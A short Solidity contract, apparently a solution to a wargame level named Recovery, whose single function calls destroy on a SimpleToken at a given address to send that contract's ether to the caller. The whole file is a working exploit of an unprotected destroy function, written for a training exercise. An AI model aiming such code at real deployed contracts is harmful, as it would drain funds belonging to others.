// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Recovery.sol";

contract RecoveryAttack {
    address payable me;
    SimpleToken instance;

    function attack(address payable recoveredAddress) public {
        me = payable(msg.sender); // My address.
        instance = SimpleToken(recoveredAddress); // Instantiate the remote contract.
        instance.destroy(me); // Call the method on the token contract.
    }
}
